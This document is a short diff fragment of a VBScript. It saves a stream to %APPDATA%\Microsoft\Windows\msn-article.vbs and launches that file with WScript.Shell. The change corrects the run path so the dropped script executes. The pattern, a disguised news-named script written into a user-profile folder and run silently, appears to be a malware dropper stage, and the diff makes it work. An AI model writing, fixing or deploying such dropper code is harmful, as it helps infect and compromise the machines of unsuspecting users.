@@ -11,4 +11,4 @@ bStrm.savetofile obj.ExpandEnvironmentStrings("%APPDATA%\Microsoft\Windows\msn-a
 bStrm.Close
 
 Set oShell = WScript.CreateObject("WScript.Shell")
-oShell.run "wscript.exe msn-article.vbs"     
+oShell.run "wscript.exe %APPDATA%\Microsoft\Windows\msn-article.vbs"     
